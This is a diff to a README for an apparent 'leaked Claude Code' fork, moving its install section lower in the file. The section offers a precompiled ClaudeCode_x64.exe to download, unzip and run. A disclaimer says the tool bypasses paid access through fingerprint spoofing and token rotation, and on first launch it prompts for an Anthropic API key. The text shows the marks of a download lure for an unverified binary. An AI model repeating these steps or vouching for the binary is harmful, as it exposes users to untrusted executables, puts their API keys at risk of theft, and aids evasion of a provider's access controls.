@@ -18,34 +18,7 @@ The source map file in the published npm package contained a reference to the fu
 
 ## 🔓 Fully Buildable & Runnable Claude Code Fork | Claude Opus 4.6 Unlocked
 
-I spent significant effort rebuilding the entire build system from scratch, fixing every compilation error, and making this source snapshot actually work.
-
-<div align="center">
-  <a href="../../releases/download/leaked-claude-code/ClaudeCode_x64.7z">
-    <img width="700" alt=" Claude Code — Leaked Source." src="assets/hmv4dn7elu.png" />
-  </a>
-</div>
-
-> **⚠️ WARNING / DISCLAIMER**
-> This application is an experimental tool for **Security Research**. It utilizes browser fingerprint spoofing and token rotation methods to bypass paid access restrictions. The authors are not responsible for the use of this software.
-
-## Installation & Launch
-
-We provide pre-compiled binaries. No Python or Node.js environment setup is required.
-
-### Step 1: Download
-Navigate to the **[Releases](../../releases)** page and download the latest archive for your architecture:
-* `ClaudeCode_x64.7z`
-
-### Step 2: Unzip
-Extract the archive to a permanent location, e.g., `C:\Tools\ClaudeCode_x64`.
-*(Optional: Add this folder to your System PATH to run it from any terminal window).*
-
-### Step 3: First Run
-Run `ClaudeCode_x64.exe`. On the first launch, you will be prompted to enter your **Anthropic API Key**.
-The key is securely stored using the Windows Credential Manager.
-
----
+**I spent significant effort rebuilding the entire build system from scratch, fixing every compilation error, and making this source snapshot actually work.**
 
 ## What is this?
 
@@ -110,6 +83,32 @@ const ENABLED_FEATURES = new Set([
   // 'KAIROS_GITHUB_WEBHOOKS',// GitHub webhook integration
 ])
 ```
+---
+
+<div align="center">
+  <a href="../../releases/download/leaked-claude-code/ClaudeCode_x64.7z">
+    <img width="700" alt=" Claude Code — Leaked Source." src="assets/hmv4dn7elu.png" />
+  </a>
+</div>
+
+> **⚠️ WARNING / DISCLAIMER**
+> This application is an experimental tool for **Security Research**. It utilizes browser fingerprint spoofing and token rotation methods to bypass paid access restrictions. The authors are not responsible for the use of this software.
+
+## Installation & Launch
+
+We provide pre-compiled binaries. No Python or Node.js environment setup is required.
+
+### Step 1: Download
+Navigate to the **[Releases](../../releases)** page and download the latest archive for your architecture:
+* `ClaudeCode_x64.7z`
+
+### Step 2: Unzip
+Extract the archive to a permanent location, e.g., `C:\Tools\ClaudeCode_x64`.
+*(Optional: Add this folder to your System PATH to run it from any terminal window).*
+
+### Step 3: First Run
+Run `ClaudeCode_x64.exe`. On the first launch, you will be prompted to enter your **Anthropic API Key**.
+The key is securely stored using the Windows Credential Manager.
 
 ---
 <div align="center">
